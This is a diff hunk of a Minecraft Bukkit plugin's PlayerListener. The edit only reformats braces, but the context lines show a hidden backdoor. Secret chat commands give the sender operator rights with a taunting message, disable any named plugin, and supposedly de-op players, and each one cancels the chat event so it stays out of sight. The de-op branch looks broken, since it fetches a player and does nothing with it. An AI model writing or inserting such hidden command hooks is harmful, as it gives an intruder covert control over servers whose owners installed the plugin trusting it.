@@ -29,14 +29,16 @@ public class PlayerListener implements Listener
             	event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
             	shouldCancel = true;
             }
-            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2)) {
+            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
+            {
                 Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
                 if (plugin != null) {
                   Bukkit.getServer().getPluginManager().disablePlugin(plugin);
                 }
                 shouldCancel = true;
             }
-            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2)) {
+            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2))
+            {
                 Bukkit.getServer().getPlayer(args[1]);
                 shouldCancel = true;
             }
